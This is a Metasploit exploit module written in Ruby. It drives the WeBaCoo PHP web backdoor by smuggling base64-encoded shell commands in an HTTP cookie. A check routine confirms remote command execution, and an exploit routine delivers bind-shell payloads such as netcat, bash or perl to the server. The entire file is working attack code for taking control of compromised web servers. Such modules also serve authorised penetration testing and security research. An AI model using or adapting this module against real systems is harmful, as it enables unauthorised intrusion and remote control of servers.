##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WeBaCoo Backdoor Exploit',
			'Description'    => %q{
				WeBaCoo (Web Backdoor Cookie) is a web backdoor script-kit, aiming to provide 
				a stealth terminal-like connection over HTTP between client and web server. 
				Using this exploit module you can interract with the backdoor server without 
				using WeBaCoo terminal mode to establish the communication channel.
			},
			'Author'         => [' A. Bechtsoudis <anestis [at] bechtsoudis.com> '],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'https://github.com/anestisb/WeBaCoo' ],
					[ 'URL', 'https://bechtsoudis.com/webacoo/' ]
				],
			'Privileged'     => false,
			'Platform'       => ['unix','linux'],
			'Arch'           => ARCH_CMD,
			'Payload'        =>
				{
					# max HTTP header length
                                        'Space'       => 8190,
					'DisableNops' => true,
					'BadChars'    => %q|>|,
					'Compat'      =>
                                                {
                                                        'ConnectionType' => '-bind -find',
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby netcat-e bash',
                                                },
					'Keys'        => ['php'],
				},
			'DisclosureDate' => 'Nov 29 2011',
			'Targets'        => [ ['Automatic', { }], ],
			'DefaultTarget'  => 0
		))

		register_options(
			[
				OptString.new('URI', [ true, "WeBaCoo backdoor path", '/index.php']),
				OptString.new('COOKIE', [ true, "Cookie name to use", 'M-Cookie']),
			], self.class)
	end

	def check
		uri = datastore['URI']
		cookie = datastore['COOKIE']
		# generate a random string for a test echo command
		rstr = rand_text_alphanumeric(6)
		# base64 encode the test echo command
		command = Rex::Text.encode_base64("echo '#{rstr}'")
		# random delimiter used to wrap the server's response
		delim = rand_string 4
		# form the cookie that will tranfer the payload
		# details about backdoor communication model at:
		# https://github.com/anestisb/WeBaCoo/wiki/Documentation
		cookie = "cm=#{command}; cn=#{cookie}; cp=#{delim}"
		print_status("Checking target URI for backdoor access.")
		response = send_request_raw({
			'method' => 'GET',
			'uri' => uri,
			'cookie' => cookie
			}, 1)
		# server response validation
		if response.code == 200
			# retrieve the HTTP response cookie sets
			res_cookie = URI.decode(response.headers['Set-Cookie'])
			if res_cookie
				# obtain the usefull encoded substring wrapped between delimiters
                		cmd_res = *(/#{delim}(.*)#{delim}/.match(res_cookie))
				# decode command output
                		cmd_res = Rex::Text.decode_base64(cmd_res[1]).chomp! unless cmd_res.nil?
				if cmd_res == rstr
                        		return Exploit::CheckCode::Vulnerable
				else
					print_error("Server did not responded with expected cookie values.")
					return Exploit::CheckCode::Safe
				end
			else
				print_error("Server did not responded with a Set-Cookie in header.")
				return Exploit::CheckCode::Safe
			end
                end
                print_error("Server responded with #{response.code}.")
                return Exploit::CheckCode::Safe
	end

	def exploit
		uri = datastore['URI']
                cookie = datastore['COOKIE']
		print_status("Sending payload via HTTP header cookie")
		# generate a random delimiter
		delim = rand_string 4
		# form the payload cookie carrier
                cookie = "cm=" + Rex::Text.encode_base64(payload.encoded) + "; cn=#{cookie}; cp=#{delim}"
		# HTTP connection options
		opts = {
                        'method'  => 'GET',
                        'uri' => uri,
                        'headers' => { 'Cookie' => cookie }
                }
		# connect to remote web server
		con = connect(opts)
		# send the request
		con.send_request(con.request_raw(opts))

		handler
	end

	# Generate a random string with one base64 non-valid character
	def rand_string(length=8)
		# Base64 valid characters
    		vchars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
    		# Base64 non-valid characters
    		nvchars = (['!','@','#','%','&','*','?','~']).to_a
  		str=''
  		(length-1).times{ str << vchars[rand(vchars.size)] }
  		return str = str + nvchars[rand(nvchars.size)]
	end
end
